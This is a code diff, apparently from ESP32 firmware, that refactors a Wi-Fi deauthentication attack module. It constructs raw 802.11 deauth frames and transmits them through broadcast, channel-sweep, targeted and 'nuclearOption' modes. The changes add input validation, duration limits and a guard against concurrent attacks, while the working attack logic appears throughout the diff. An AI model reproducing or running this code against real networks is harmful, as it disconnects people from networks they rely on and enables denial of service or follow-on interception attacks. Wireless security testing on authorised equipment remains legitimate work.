@@ -23,31 +23,38 @@ typedef struct {
     uint8_t reasonCode[2];
 } DeauthFrame;
 
-void buildDeauthFrame(DeauthFrame *frame, const uint8_t *dest,
-                      const uint8_t *src, const uint8_t *bssid) {
-    frame->frameCtrl[0] = 0xC0;  // Type: Deauthentication
+// Constants for frame building
+static const uint8_t DEAUTH_FRAME_CTRL_0 = 0xC0;
+static const uint8_t DEAUTH_DURATION_0 = 0x3A;
+static const uint8_t DEAUTH_DURATION_1 = 0x01;
+static const uint8_t DEAUTH_REASON_0 = 0x01;
+static const uint8_t DEAUTH_REASON_1 = 0x00;
+static const size_t MAC_ADDR_LEN = 6;
+static const uint32_t MIN_DURATION_MS = 100;
+static const uint32_t MAX_DURATION_MS = 600000;  // 10 minutes max
+
+inline void buildDeauthFrame(DeauthFrame *frame, const uint8_t *dest,
+                             const uint8_t *src, const uint8_t *bssid) {
+    frame->frameCtrl[0] = DEAUTH_FRAME_CTRL_0;
     frame->frameCtrl[1] = 0x00;
-
-    frame->duration[0] = 0x3A;
-    frame->duration[1] = 0x01;
-
-    memcpy(frame->destAddr, dest, 6);
-    memcpy(frame->srcAddr, src, 6);
-    memcpy(frame->bssidAddr, bssid, 6);
-
-    frame->seqCtrl[0] = (esp_random() % 255);
-    frame->seqCtrl[1] = (esp_random() % 255);
-
-    frame->reasonCode[0] = 0x01;  // Unspecified reason
-    frame->reasonCode[1] = 0x00;
+    frame->duration[0] = DEAUTH_DURATION_0;
+    frame->duration[1] = DEAUTH_DURATION_1;
+    memcpy(frame->destAddr, dest, MAC_ADDR_LEN);
+    memcpy(frame->srcAddr, src, MAC_ADDR_LEN);
+    memcpy(frame->bssidAddr, bssid, MAC_ADDR_LEN);
+    frame->seqCtrl[0] = esp_random() & 0xFF;
+    frame->seqCtrl[1] = esp_random() & 0xFF;
+    frame->reasonCode[0] = DEAUTH_REASON_0;
+    frame->reasonCode[1] = DEAUTH_REASON_1;
 }
 
-void sendDeauthPacket(const uint8_t *dest, const uint8_t *src, const uint8_t *bssid) {
+inline void sendDeauthPacket(const uint8_t *dest, const uint8_t *src, const uint8_t *bssid) {
+    if (unlikely(!dest || !src || !bssid)) return;
+
     DeauthFrame frame;
     buildDeauthFrame(&frame, dest, src, bssid);
 
-    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, (void *)&frame, sizeof(frame), false);
-    if (ret == ESP_OK) {
+    if (esp_wifi_80211_tx(WIFI_IF_STA, (void *)&frame, sizeof(frame), false) == ESP_OK) {
         g_packetCount++;
     }
 }
@@ -56,8 +63,18 @@ void sendDeauthPacket(const uint8_t *dest, const uint8_t *src, const uint8_t *bs
 DeauthResult nuclearOption(uint32_t durationMs) {
     DeauthResult result = {false, 0, 0, 0, ""};
 
+    if (g_attacking) {
+        result.error = "Attack already in progress";
+        return result;
+    }
+
     if (!TxArm::isArmed()) {
         result.error = "TX not armed";
+        return result;
+    }
+
+    if (durationMs < MIN_DURATION_MS || durationMs > MAX_DURATION_MS) {
+        result.error = "Invalid duration (100ms-600s)";
         return result;
     }
 
@@ -124,8 +141,18 @@ DeauthResult nuclearOption(uint32_t durationMs) {
 DeauthResult broadcastDeauth(const DeauthConfig &config) {
     DeauthResult result = {false, 0, 0, 0, ""};
 
+    if (g_attacking) {
+        result.error = "Attack already in progress";
+        return result;
+    }
+
     if (!TxArm::isArmed()) {
         result.error = "TX not armed";
+        return result;
+    }
+
+    if (config.durationMs < MIN_DURATION_MS || config.durationMs > MAX_DURATION_MS) {
+        result.error = "Invalid duration (100ms-600s)";
         return result;
     }
 
@@ -174,8 +201,18 @@ DeauthResult broadcastDeauth(const DeauthConfig &config) {
 DeauthResult channelSweep(const DeauthConfig &config) {
     DeauthResult result = {false, 0, 0, 0, ""};
 
+    if (g_attacking) {
+        result.error = "Attack already in progress";
+        return result;
+    }
+
     if (!TxArm::isArmed()) {
         result.error = "TX not armed";
+        return result;
+    }
+
+    if (config.durationMs < MIN_DURATION_MS || config.durationMs > MAX_DURATION_MS) {
+        result.error = "Invalid duration (100ms-600s)";
         return result;
     }
 
@@ -227,8 +264,18 @@ DeauthResult channelSweep(const DeauthConfig &config) {
 DeauthResult targeted(const DeauthConfig &config) {
     DeauthResult result = {false, 0, 0, 0, ""};
 
+    if (g_attacking) {
+        result.error = "Attack already in progress";
+        return result;
+    }
+
     if (!TxArm::isArmed()) {
         result.error = "TX not armed";
+        return result;
+    }
+
+    if (config.durationMs < MIN_DURATION_MS || config.durationMs > MAX_DURATION_MS) {
+        result.error = "Invalid duration (100ms-600s)";
         return result;
     }
 
@@ -275,13 +322,25 @@ DeauthResult sendDeauthFrames(const String &targetBSSID, uint32_t durationMs, bo
     config.packetsPerSec = 150;
     config.targetChannel = 6;
 
-    // Parse BSSID string to bytes
+    // Parse BSSID string to bytes (validate format AA:BB:CC:DD:EE:FF)
     uint8_t bssid[6] = {0};
-    if (targetBSSID.length() == 17) {  // AA:BB:CC:DD:EE:FF
-        for (int i = 0; i < 6; i++) {
-            String hex = targetBSSID.substring(i * 3, i * 3 + 2);
-            bssid[i] = (uint8_t)strtol(hex.c_str(), nullptr, 16);
+    DeauthResult result = {false, 0, 0, 0, ""};
+
+    if (targetBSSID.length() != 17) {
+        result.error = "Invalid BSSID format (expected AA:BB:CC:DD:EE:FF)";
+        return result;
+    }
+
+    for (int i = 0; i < 6; i++) {
+        String hex = targetBSSID.substring(i * 3, i * 3 + 2);
+        char *endptr = nullptr;
+        long value = strtol(hex.c_str(), &endptr, 16);
+
+        if (endptr == hex.c_str() || value < 0 || value > 255) {
+            result.error = "Invalid BSSID hex value";
+            return result;
         }
+        bssid[i] = (uint8_t)value;
     }
     memcpy(config.targetBssid, bssid, 6);
 
